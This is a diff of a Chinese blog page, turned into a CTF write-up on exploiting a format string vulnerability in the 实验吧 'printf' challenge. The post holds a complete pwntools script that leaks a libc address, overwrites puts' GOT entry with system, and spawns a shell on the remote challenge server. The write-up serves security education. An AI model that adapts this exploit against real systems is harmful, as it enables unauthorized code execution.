@@ -6,15 +6,26 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>Archives | 怪咖的小屋</title>
+  <title>怪咖的小屋</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
+  <meta name="description" content="格式化字符串漏洞利用 格式化字符串漏洞利用以实验吧 printf为例：漏洞利用思路：  注意到在get_file中存在格式化字符串漏洞，利用其泄露出真实的puts地址，从而计算得到真实的system地址 将puts的got表覆盖成真实的system地址，并将其参数布局成 ‘/bin/sh’ 在dir_file功能中调用puts(“/bin/sh”)时，相当于调用了system(“/bin/sh”)">
+<meta property="og:type" content="article">
 <meta property="og:title" content="怪咖的小屋">
-<meta property="og:url" content="http://yoursite.com/archives/index.html">
+<meta property="og:url" content="http://yoursite.com/2019/09/10/PWN/格式化字符串漏洞利用/index.html">
 <meta property="og:site_name" content="怪咖的小屋">
+<meta property="og:description" content="格式化字符串漏洞利用 格式化字符串漏洞利用以实验吧 printf为例：漏洞利用思路：  注意到在get_file中存在格式化字符串漏洞，利用其泄露出真实的puts地址，从而计算得到真实的system地址 将puts的got表覆盖成真实的system地址，并将其参数布局成 ‘/bin/sh’ 在dir_file功能中调用puts(“/bin/sh”)时，相当于调用了system(“/bin/sh”)">
 <meta property="og:locale" content="zh">
+<meta property="og:image" content="http://yoursite.com/2019/09/10/PWN/格式化字符串漏洞利用/_resources/19a4a1a3fbdeaebe9be40c9bb7048e88.png">
+<meta property="og:image" content="http://yoursite.com/2019/09/10/PWN/格式化字符串漏洞利用/_resources/79076a875c0be0f6d97d4c473253830b.png">
+<meta property="og:image" content="http://yoursite.com/2019/09/10/PWN/格式化字符串漏洞利用/_resources/12f365ca9d4c0974c5c199fc01c77ad1.png">
+<meta property="og:image" content="http://yoursite.com/2019/09/10/PWN/格式化字符串漏洞利用/_resources/3b2274e6c5035e053d8ae71843504655.png">
+<meta property="og:image" content="http://yoursite.com/2019/09/10/PWN/格式化字符串漏洞利用/_resources/3e106ca9b4c77a52be5e124bc8b9a7b2.png">
+<meta property="og:image" content="http://yoursite.com/2019/09/10/PWN/格式化字符串漏洞利用/_resources/1f07ab3fcea14d0a0bd825f8e810efb4.png">
+<meta property="og:updated_time" content="2019-09-10T08:58:12.562Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="怪咖的小屋">
+<meta name="twitter:description" content="格式化字符串漏洞利用 格式化字符串漏洞利用以实验吧 printf为例：漏洞利用思路：  注意到在get_file中存在格式化字符串漏洞，利用其泄露出真实的puts地址，从而计算得到真实的system地址 将puts的got表覆盖成真实的system地址，并将其参数布局成 ‘/bin/sh’ 在dir_file功能中调用puts(“/bin/sh”)时，相当于调用了system(“/bin/sh”)">
+<meta name="twitter:image" content="http://yoursite.com/2019/09/10/PWN/格式化字符串漏洞利用/_resources/19a4a1a3fbdeaebe9be40c9bb7048e88.png">
   
     <link rel="alternative" href="/atom.xml" title="怪咖的小屋" type="application/atom+xml">
   
@@ -146,235 +157,170 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-PWN/格式化字符串漏洞利用" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>格式化字符串漏洞利用</p>
+<h4 id="格式化字符串漏洞利用"><a href="#格式化字符串漏洞利用" class="headerlink" title="格式化字符串漏洞利用"></a><strong>格式化字符串漏洞利用</strong></h4><p>以<strong>实验吧 printf</strong>为例：<br><strong>漏洞利用思路</strong>：</p>
+<ol>
+<li>注意到在get_file中存在格式化字符串漏洞，利用其泄露出真实的puts地址，从而计算得到真实的system地址</li>
+<li>将puts的got表覆盖成真实的system地址，并将其参数布局成 ‘/bin/sh’</li>
+<li>在dir_file功能中调用puts(“/bin/sh”)时，相当于调用了system(“/bin/sh”)<br><img src="/2019/09/10/PWN/格式化字符串漏洞利用/_resources/19a4a1a3fbdeaebe9be40c9bb7048e88.png" alt><br><img src="/2019/09/10/PWN/格式化字符串漏洞利用/_resources/79076a875c0be0f6d97d4c473253830b.png" alt><br>使用<strong>objdump</strong>得到想要的信息：<br>拿到<strong>puts的got表地址</strong>：<br><img src="/2019/09/10/PWN/格式化字符串漏洞利用/_resources/12f365ca9d4c0974c5c199fc01c77ad1.png" alt><br>拿到他们<strong>在libc中的偏移</strong>：<br><img src="/2019/09/10/PWN/格式化字符串漏洞利用/_resources/3b2274e6c5035e053d8ae71843504655.png" alt><br>找见<strong>可控字段</strong>：<br><img src="/2019/09/10/PWN/格式化字符串漏洞利用/_resources/3e106ca9b4c77a52be5e124bc8b9a7b2.png" alt></li>
+</ol>
+<p><strong>偏移量</strong>为：(0xd24c-0xd230)/4 = 7<br>利用printf打印出puts的got表中对应的真实的puts地址，使用其计算得到真实的system地址</p>
+<p><strong>计算方法</strong>如下：<br>addr_libc = addr_puts - offset_puts<br>addr_system = addr_libc + offset_system<br>利用%n覆写puts的got表地址，拿到shell</p>
+<p><strong>exp</strong>如下：</p>
+<h1 id="coding-utf-8"><a href="#coding-utf-8" class="headerlink" title="-- coding:utf-8 --"></a>-<em>- coding:utf-8 -</em>-</h1><p>from  pwn  import  *</p>
+<p>def  puts_file(io,  name,content):<br>    io.recvuntil(‘ftp&gt;’)<br>    io.sendline(‘put’)<br>    io.recvuntil(‘upload:’)<br>    io.sendline(name)<br>    io.recvuntil(‘content:’)<br>    io.sendline(content)</p>
+<p>def  get_file(io,  name):<br>    io.recvuntil(‘ftp&gt;’)<br>    io.sendline(‘get’)<br>    io.recvuntil(‘get:’)<br>    io.sendline(name)</p>
+<p>def  dir_file(io):<br>    io.recvuntil(‘ftp&gt;’)<br>    io.sendline(‘dir’)</p>
+<p>def  pwn(io):<br>    print  ‘Start!’<br>    fake_username  =  ‘sysbdmin’<br>    real_username  =  ‘’<br>    #计算出真实的用户名<br>    for  i  in  fake_username:<br>        real_username  +=  chr(ord(i)  -  1)<br>    io.recvuntil(‘Name (ftp.hacker.server:Rainism):’)<br>    io.sendline(real_username)<br>    print  ‘[<em>] real_username : ‘,real_username<br>    #得到puts的got表地址<br>    got_puts  =  0x0804a028<br>    #得到puts的偏移量<br>    offset_puts  =  0x5fca0<br>    content  =  p32(got_puts)  +  ‘%7$s…’<br>    #构造之后system调用的参数(“/bin/sh”)<br>    name  =  ‘/sh’<br>    puts_file(io,  name,  content)<br>    get_file(io,  name)<br>    #利用printf的格式化字符串漏洞打印出真实的puts地址<br>    data  =  io.recvuntil(‘…’)[0:]<br>    addr_puts  =  u32(data[4:8])<br><br>    print  ‘[</em>] addr_puts: ‘,hex(addr_puts)<br>    #计算libc的基址<br>    addr_libc  =  addr_puts  -  offset_puts<br>    offset_system  =  0x3ada0<br>    #计算system的真实地址<br>    addr_system  =  addr_libc  +  offset_system<br>    print  ‘[<em>] addr_system: ‘,hex(addr_system)<br><br>    addr_info  =  ‘’<br>    padding_info  =  ‘’<br>    #覆盖puts的got表地址<br>    system_addr_buff  =  p32(addr_system)<br>    begin_index  =  7<br>    offset  =  16<br>    for  i  in  range(4):<br>        addr_info  +=  p32(got_puts  +  i)<br>        val  =  ord(system_addr_buff[i])<br>        count  =  val  -  offset<br>        if  count  &lt;  0  :<br>            count  +=  0x100<br><br>        padding_info  +=  ‘%%%dc’  %  count  +  ‘%%%d$hhn’  %  (begin_index  +  i)<br><br>        offset  =  val<br>    print  ‘[</em>] Start Attacking!’<br>    #与之前创建的文件名组成了system的参数(“/bin/sh”)<br>    name  =  ‘/bin’<br>    content  =  addr_info  +  padding_info<br>    puts_file(io,  name,  content)<br>    print  ‘[<em>] puts_file succeed!’<br>    get_file(io,  name)<br>    print  ‘[</em>] get_file succeed!’<br>    dir_file(io)<br>    print  ‘[*] dir_file succeed!’<br>    io.interactive()</p>
+<p>def  main():<br>    io  =  remote(‘106.2.25.7’,8001)<br>    pwn(io)</p>
+<p>if  <strong>name</strong>  ==  ‘<strong>main</strong>‘:<br>    main()<br><strong>运行结果</strong>如下：<br><img src="/2019/09/10/PWN/格式化字符串漏洞利用/_resources/1f07ab3fcea14d0a0bd825f8e810efb4.png" alt></p>
+
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>感觉还不错的话就嘿嘿嘿吧<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    <div class="reward-box-item">
+                      <img class="reward-img" src="/assets/img/alipay.jpg">
+                      <span class="reward-type">支付宝</span>
+                    </div>
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+    </div>
+    <div class="article-info article-info-index">
       
       
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2019" class="archive-year">2019</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/09/10/Reverse/输入表重建工具ImportREC/" class="archive-article-date">
-  	<time datetime="2019-09-10T08:58:12.709Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-10</time>
-</a>
-        </div>
-    	 
-        <div class="article-info info-on-right">
-          
-          
+      
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2019/09/10/PWN/格式化字符串漏洞利用/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/09/10/Python/Python网络编程/" class="archive-article-date">
-  	<time datetime="2019-09-10T08:58:12.693Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-10</time>
-</a>
-        </div>
-    	 
-        <div class="article-info info-on-right">
-          
-          
 
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/09/10/Python/Python字符串开头b r u含义/" class="archive-article-date">
-  	<time datetime="2019-09-10T08:58:12.677Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-10</time>
-</a>
-        </div>
-    	 
-        <div class="article-info info-on-right">
-          
-          
+<nav id="article-nav">
+  
+    <a href="/2019/09/10/Python/Python 邮件编程/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2019/09/10/PWN/Pythonpwn使用方法/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title"></div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
 
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/09/10/Python/Pythonpexpect/" class="archive-article-date">
-  	<time datetime="2019-09-10T08:58:12.660Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-10</time>
-</a>
-        </div>
-    	 
-        <div class="article-info info-on-right">
-          
-          
 
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/09/10/Python/Python z3-solver/" class="archive-article-date">
-  	<time datetime="2019-09-10T08:58:12.643Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-10</time>
-</a>
-        </div>
-    	 
-        <div class="article-info info-on-right">
-          
-          
+        
+        
+    </div>
+</aside>
 
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/09/10/Python/Python binascii模块/" class="archive-article-date">
-  	<time datetime="2019-09-10T08:58:12.627Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-10</time>
-</a>
-        </div>
-    	 
-        <div class="article-info info-on-right">
-          
-          
 
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/09/10/Python/PythonPIL简单编程/" class="archive-article-date">
-  	<time datetime="2019-09-10T08:58:12.609Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-10</time>
-</a>
-        </div>
-    	 
-        <div class="article-info info-on-right">
-          
-          
 
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/09/10/Python/PythonHash/" class="archive-article-date">
-  	<time datetime="2019-09-10T08:58:12.592Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-10</time>
-</a>
-        </div>
-    	 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/09/10/Python/Python 邮件编程/" class="archive-article-date">
-  	<time datetime="2019-09-10T08:58:12.575Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-10</time>
-</a>
-        </div>
-    	 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/09/10/PWN/格式化字符串漏洞利用/" class="archive-article-date">
-  	<time datetime="2019-09-10T08:58:12.559Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-10</time>
-</a>
-        </div>
-    	 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
   
   
-    </div></section>
   
 
-    
-    <nav id="page-nav">
-      <span class="page-number current">1</span><a class="page-number" href="/archives/page/2/">2</a><a class="extend next" rel="next" href="/archives/page/2/">Next &raquo;</a>
-    </nav>
+  
+
+  
+
   
 
 
@@ -398,8 +344,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
